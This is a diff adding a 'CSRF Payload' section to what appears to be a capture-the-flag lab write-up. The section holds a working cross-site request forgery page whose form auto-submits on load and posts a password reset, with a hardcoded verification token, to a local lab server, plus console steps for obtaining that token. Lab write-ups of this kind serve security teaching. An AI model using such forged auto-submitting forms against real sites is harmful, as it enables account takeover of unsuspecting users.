@@ -41,3 +41,31 @@ document.addEventListener('click', (event) => {
 </body>
 </html>
 ```
+
+# CSRF Payload
+```JavaScript
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>Flag 4</title>
+</head>
+// Loads document and submits form
+<body onload=document.forms[0].submit()>
+  // Utilizes action to load a specific page, such as reset-password
+  <form action="http://localhost:7149/api/profile/reset-password" method="POST">
+        <input type="hidden" name="password" value="DeadDrop99">
+        <input type="hidden" name="gtId" value="904160213">
+        <input type="hidden" name="funNumber" value="2025">
+        <input type="hidden" name="randomNumber" value="72662">
+        <input type="hidden" name="__RequestVerificationToken" value="84508">
+  </form>
+</body>
+</html>
+```
+```
+# To get the randomNumber and __ResetVerificationToken above, run in console
+var pair = window.generateRequestVerificationToken('904160213', 'DeadDrop99');
+console.log(pair);
+# Hardcode into form...doesn't change
+```
